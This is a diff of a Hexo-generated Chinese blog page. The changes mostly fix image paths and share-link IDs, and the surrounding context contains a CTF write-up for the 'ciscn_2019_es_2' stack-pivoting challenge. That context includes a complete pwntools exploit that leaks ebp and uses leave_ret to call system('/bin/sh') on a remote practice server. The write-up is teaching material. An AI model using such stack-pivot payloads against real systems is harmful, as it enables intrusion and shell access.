@@ -122,7 +122,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/05/16/guestbook/" data-id="cl38vikuh0006yguq0oshd80r" data-title="jarvisoj_tell_me_something" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/05/16/guestbook/" data-id="cl38vsj1y0005wsuq2yw706f0" data-title="jarvisoj_tell_me_something" class="article-share-link">Share</a>
       
       
       
@@ -174,8 +174,8 @@
 <p>有<code>system</code>函数，但没有/bin/sh字符串，需要自己写入。</p>
 <p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220503213714353.png" alt="image-20220503213714353"></p>
 <p>通过main函数，进入vul函数，分析vul函数：</p>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220503213847104.png" alt="image-20220503213847104"></p>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\QQ图片20220503215028.png" alt="QQ图片20220503215028"></p>
+<p><img src="/2022/05/04/ciscn-2019-es-2%E6%A0%88%E8%BF%81%E7%A7%BB-1/image-20220503213847104.png" alt="image-20220503213847104"></p>
+<p><img src="/2022/05/04/ciscn-2019-es-2%E6%A0%88%E8%BF%81%E7%A7%BB-1/QQ%E5%9B%BE%E7%89%8720220503215028.png" alt="QQ图片20220503215028"></p>
 <p>read函数的大小是0x30，存在栈溢出但只能覆盖ebp和eip。因此使用栈迁移解决栈空间不足的问题。</p>
 <h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP:"></a>完整EXP:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(&#x27;./buu27&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27598</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+<span class="string">&#x27;b&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;c&#x27;</span>*<span class="number">4</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;name?\n&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">ebp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line"></span><br><span class="line">system = <span class="number">0x08048400</span></span><br><span class="line">leave_ret = <span class="number">0x080485FD</span></span><br><span class="line">payload2 = <span class="string">&#x27;aaaa&#x27;</span> + p32(system) + p32(<span class="number">0x1</span>) + p32(ebp-<span class="number">0x28</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(ebp-<span class="number">0x38</span>)+p32(leave_ret)</span><br><span class="line"></span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
@@ -185,28 +185,28 @@
 <p> 这里注意只能用<code>send</code>函数，不能使用<code>sendline</code>函数。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">send(data) <span class="comment">#发送数据。</span></span><br><span class="line">sendline(data) <span class="comment">#发送一行数据，相当于在数据末尾加\n。</span></span><br><span class="line"><span class="comment">#sendline 会使得printf到bbbb处终止，无法将ebp带出来</span></span><br></pre></td></tr></table></figure>
 
-<p> <img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220503233810307.png" alt="image-20220503233810307"></p>
+<p> <img src="/2022/05/04/ciscn-2019-es-2%E6%A0%88%E8%BF%81%E7%A7%BB-1/image-20220503233810307.png" alt="image-20220503233810307"></p>
 <p> 得到ebp是<code>0xffc1bc68</code>，距离esp，即s的首地址<code>0xffc1bc30</code>的距离位0x38。</p>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220503234227458.png" alt="image-20220503234227458"></p>
+<p><img src="/2022/05/04/ciscn-2019-es-2%E6%A0%88%E8%BF%81%E7%A7%BB-1/image-20220503234227458.png" alt="image-20220503234227458"></p>
 <p>vul函数在返回到main函数的时候会调用<code>leave_ret</code>，转移ebp和eip。</p>
 <p>第二次栈溢出：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">system = <span class="number">0x08048400</span></span><br><span class="line">leave_ret = <span class="number">0x080485FD</span></span><br><span class="line">payload2 = <span class="string">&#x27;aaaa&#x27;</span> + p32(system) + p32(<span class="number">0x1</span>) + p32(ebp-<span class="number">0x28</span>)+<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">payload2=payload2.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload2+=p32(ebp-<span class="number">0x38</span>)+p32(leave_ret)</span><br></pre></td></tr></table></figure>
 
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\QQ图片20220504002610.png" alt="QQ图片20220504002610"></p>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220504001706189.png" alt="image-20220504001706189"></p>
+<p><img src="/2022/05/04/ciscn-2019-es-2%E6%A0%88%E8%BF%81%E7%A7%BB-1/QQ%E5%9B%BE%E7%89%8720220504002610.png" alt="QQ图片20220504002610"></p>
+<p><img src="/2022/05/04/ciscn-2019-es-2%E6%A0%88%E8%BF%81%E7%A7%BB-1/image-20220504001706189.png" alt="image-20220504001706189"></p>
 <p>vul函数调用leave前，ebp指向的地址的数据就是esp ，即<code>ebp-0x38</code></p>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220504001842841.png" alt="image-20220504001842841"></p>
+<p><img src="/2022/05/04/ciscn-2019-es-2%E6%A0%88%E8%BF%81%E7%A7%BB-1/image-20220504001842841.png" alt="image-20220504001842841"></p>
 <p>执行leave命令后，即<code>mov esp, sbp</code> <code>pop ebp</code>， 即可以看到<code>ebp = ebp -0x38</code>，esp到了返回地址eip的地方。</p>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220504002112280.png" alt="image-20220504002112280"></p>
+<p><img src="/2022/05/04/ciscn-2019-es-2%E6%A0%88%E8%BF%81%E7%A7%BB-1/image-20220504002112280.png" alt="image-20220504002112280"></p>
 <p>执行ret命令，即<code>pop eip</code>，eip又指向了<code>leave_ret</code>，执行第二次<code>leave_ret</code>完成栈迁移</p>
-<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20220504002258382.png" alt="image-20220504002258382"></p>
+<p><img src="/2022/05/04/ciscn-2019-es-2%E6%A0%88%E8%BF%81%E7%A7%BB-1/image-20220504002258382.png" alt="image-20220504002258382"></p>
 <p>执行完第二次，ebp为’aaaa’， eip指向了system函数地址，esp是system函数的返回地址0x1。</p>
 <p>现在我们回过头看payload，就不难理解前面padding的aaaa的作用了。ebp-0x38指向aaaa的地址。aaaa实际就是leave_ret后的ebp指向地址的内容，可以起到定位的作用。因为接下来我们输入的leave_ret会使esp等于ebp后面的地址，而此时ebp后面的地址是system。之后就能getshell了。</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/05/04/ciscn-2019-es-2%E6%A0%88%E8%BF%81%E7%A7%BB-1/" data-id="cl38vikub0001yguqc2mgggkl" data-title="ciscn_2019_es_2栈迁移" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/05/04/ciscn-2019-es-2%E6%A0%88%E8%BF%81%E7%A7%BB-1/" data-id="cl38vsj1p0000wsuq31gzcamo" data-title="ciscn_2019_es_2栈迁移" class="article-share-link">Share</a>
       
       
       
@@ -246,7 +246,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/04/19/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" data-id="cl38vikuh0007yguqekan41cn" data-title="hexo博客搭建" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/04/19/hexo%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" data-id="cl38vsj210008wsuq9ai83r91" data-title="hexo博客搭建" class="article-share-link">Share</a>
       
       
       
@@ -297,7 +297,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2022/01/10/hello-world/" data-id="cl38viku60000yguq4gkg6vyc" data-title="Hello World" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2022/01/10/hello-world/" data-id="cl38vsj1z0006wsuq2jy6d7z1" data-title="Hello World" class="article-share-link">Share</a>
       
       
       
